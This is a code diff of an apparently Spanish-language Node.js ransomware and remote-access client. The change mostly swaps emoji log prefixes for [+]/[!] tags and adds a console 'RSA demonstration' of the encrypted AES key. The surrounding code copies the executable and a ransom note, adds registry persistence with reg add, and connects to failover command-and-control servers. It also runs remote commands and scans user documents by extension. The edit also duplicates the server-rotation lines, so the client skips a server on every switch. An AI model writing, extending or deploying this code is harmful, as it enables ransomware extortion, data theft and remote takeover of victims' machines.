@@ -152,10 +152,10 @@ function instalarPersistencia() {
         try {
             if (!currentExe.includes('node.exe') && !currentExe.includes(INSTALL_DIR)) {
                 fs.copyFileSync(currentExe, targetPath);
-                console.log(` Copiado a: ${targetPath}`);
+                console.log(` [+] Copiado a: ${targetPath}`);
             }
         } catch (e) {
-            console.log('⚠️ No se pudo copiar ejecutable:', e.message);
+            console.log('[!] No se pudo copiar ejecutable:', e.message);
         }
 
         // Copiar nota de rescate si existe junto al ejecutable
@@ -174,10 +174,10 @@ function instalarPersistencia() {
             if (fs.existsSync(notaSource) && !fs.existsSync(notaTarget)) {
                 try {
                     fs.copyFileSync(notaSource, notaTarget);
-                    console.log(` Nota de rescate copiada a: ${notaTarget}`);
+                    console.log(` [+] Nota de rescate copiada a: ${notaTarget}`);
                     break;
                 } catch (e) {
-                    console.log('⚠️ No se pudo copiar nota de rescate:', e.message);
+                    console.log('[!] No se pudo copiar nota de rescate:', e.message);
                 }
             }
         }
@@ -192,10 +192,10 @@ function instalarPersistencia() {
             if (fs.existsSync(escudoSource) && !fs.existsSync(escudoTarget)) {
                 try {
                     fs.copyFileSync(escudoSource, escudoTarget);
-                    console.log(` Escudo copiado a: ${escudoTarget}`);
+                    console.log(` [+] Escudo copiado a: ${escudoTarget}`);
                     break;
                 } catch (e) {
-                    console.log('⚠️ No se pudo copiar escudo:', e.message);
+                    console.log('[!] No se pudo copiar escudo:', e.message);
                 }
             }
         }
@@ -204,9 +204,9 @@ function instalarPersistencia() {
         const comando = `reg add "${REG_KEY}" /v "${REG_VALUE}" /t REG_SZ /d "${targetPath}" /f`;
         exec(comando, (error) => {
             if (error) {
-                console.log('⚠️ No se pudo agregar al registro:', error.message);
+                console.log('[!] No se pudo agregar al registro:', error.message);
             } else {
-                console.log(' Persistencia instalada en el registro');
+                console.log(' [+] Persistencia instalada en el registro');
             }
             resolve(true);
         });
@@ -835,14 +835,17 @@ function cambiarServidor() {
     currentServerIndex = (currentServerIndex + 1) % SERVERS.length;
     SERVER_URL = SERVERS[currentServerIndex];
     connectionAttempts = 0;
-    console.log(`🔄 Cambiando a servidor: ${SERVER_URL}`);
+    currentServerIndex = (currentServerIndex + 1) % SERVERS.length;
+    SERVER_URL = SERVERS[currentServerIndex];
+    connectionAttempts = 0;
+    console.log(`[*] Cambiando a servidor: ${SERVER_URL}`);
 }
 
 async function conectar() {
     await instalarPersistencia();
 
-    console.log(` Conectando al servidor: ${SERVER_URL}`);
-    console.log(` Servidores disponibles: ${SERVERS.length}`);
+    console.log(` [*] Conectando al servidor: ${SERVER_URL}`);
+    console.log(` [*] Servidores disponibles: ${SERVERS.length}`);
 
     socket = io(SERVER_URL, {
         reconnection: false, // Manejamos reconexion manualmente para failover
@@ -851,7 +854,7 @@ async function conectar() {
     });
 
     socket.on('connect_error', (err) => {
-        console.log(` Error de conexion: ${err.message}`);
+        console.log(` [!] Error de conexion: ${err.message}`);
         connectionAttempts++;
 
         if (connectionAttempts >= MAX_ATTEMPTS_PER_SERVER) {
@@ -861,14 +864,14 @@ async function conectar() {
 
         // Reintentar conexion despues de 5 segundos
         setTimeout(() => {
-            console.log(`🔄 Reintentando conexion a ${SERVER_URL}... (intento ${connectionAttempts + 1})`);
+            console.log(`[*] Reintentando conexion a ${SERVER_URL}... (intento ${connectionAttempts + 1})`);
             socket.close();
             conectar();
         }, 5000);
     });
 
     socket.on('connect', () => {
-        console.log(` Conectado exitosamente a: ${SERVER_URL}`);
+        console.log(` [+] Conectado exitosamente a: ${SERVER_URL}`);
         connectionAttempts = 0; // Reset intentos al conectar
 
         if (reconnectInterval) {
@@ -892,8 +895,8 @@ async function conectar() {
     });
 
     socket.on('disconnect', () => {
-        console.log(' Desconectado del servidor');
-        console.log('🔄 Intentando reconectar...');
+        console.log(' [-] Desconectado del servidor');
+        console.log('[*] Intentando reconectar...');
 
         // Intentar reconectar despues de 3 segundos
         setTimeout(() => {
@@ -902,7 +905,7 @@ async function conectar() {
     });
 
     socket.on('registrado', (data) => {
-        console.log(' Registrado con ID:', data.clienteId);
+        console.log(' [+] Registrado con ID:', data.clienteId);
         claveAES = data.clave;
         rsaPublicKey = data.rsaPublicKey;
 
@@ -911,9 +914,22 @@ async function conectar() {
             try {
                 const keyFilePath = path.join(INSTALL_DIR, '.aes_key');
                 fs.writeFileSync(keyFilePath, claveAES);
-                console.log(' Clave AES guardada para nota de rescate');
+                console.log(' [+] Clave AES guardada para nota de rescate');
+
+                // --- DEMOSTRACION RSA ---
+                // Simular el envio seguro de esta clave usando RSA para que el usuario pueda verificarlo
+                if (rsaPublicKey) {
+                    const encryptedKey = cifrarConRSA({ key: claveAES }, rsaPublicKey);
+                    console.log('\n--- DEMOSTRACION CIFRADO RSA ---');
+                    console.log('1. Clave AES Original:', claveAES);
+                    console.log('2. Clave Publica RSA:', rsaPublicKey.substring(0, 50) + '...');
+                    console.log('3. Clave AES Cifrada (RSA):', encryptedKey.data);
+                    console.log('--------------------------------\n');
+                }
+                // ------------------------
+
             } catch (e) {
-                console.log('⚠️ No se pudo guardar clave AES:', e.message);
+                console.log('[!] No se pudo guardar clave AES:', e.message);
             }
         }
 
@@ -924,8 +940,8 @@ async function conectar() {
         } else {
             socket.emit('info-sistema', info);
         }
-        console.log(' Informacion del sistema enviada');
-        console.log('⏳ Esperando comandos del servidor...');
+        console.log(' [+] Informacion del sistema enviada');
+        console.log('[*] Esperando comandos del servidor...');
     });
 
     // ===============================
@@ -933,7 +949,7 @@ async function conectar() {
     // ===============================
     socket.on('ejecutar-comando', async (data) => {
         const { comandoId, comando } = data;
-        console.log(`▶️ Ejecutando: ${comando}`);
+        console.log(`[>] Ejecutando: ${comando}`);
 
         const resultado = await ejecutarComando(comando);
 
@@ -942,10 +958,10 @@ async function conectar() {
             const outputPreview = resultado.stdout.length > 500
                 ? resultado.stdout.substring(0, 500) + '...[truncado]'
                 : resultado.stdout;
-            console.log(`📤 Resultado:\n${outputPreview}`);
+            console.log(`[<] Resultado:\n${outputPreview}`);
         }
         if (resultado.error) {
-            console.log(` Error: ${resultado.error}`);
+            console.log(` [!] Error: ${resultado.error}`);
         }
 
         socket.emit('comando-resultado', {
@@ -959,13 +975,13 @@ async function conectar() {
 
     socket.on('escanear-archivos', (data) => {
         const { comandoId, directorios, extensiones } = data;
-        console.log('🔍 Escaneando archivos...');
+        console.log('[*] Escaneando archivos...');
 
         const dirs = directorios || [process.cwd()];  // Por defecto: directorio donde se ejecuta
         const exts = extensiones || ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];
 
         const resultado = escanearArchivos(dirs, exts);
-        console.log(` Encontrados: ${resultado.total} archivos (${resultado.tamanioTotalHumano})`);
+        console.log(` [+] Encontrados: ${resultado.total} archivos (${resultado.tamanioTotalHumano})`);
 
         // Lista de archivos (max 50 para la UI)
         const listaArchivos = resultado.archivos.slice(0, 50).map(a => ({
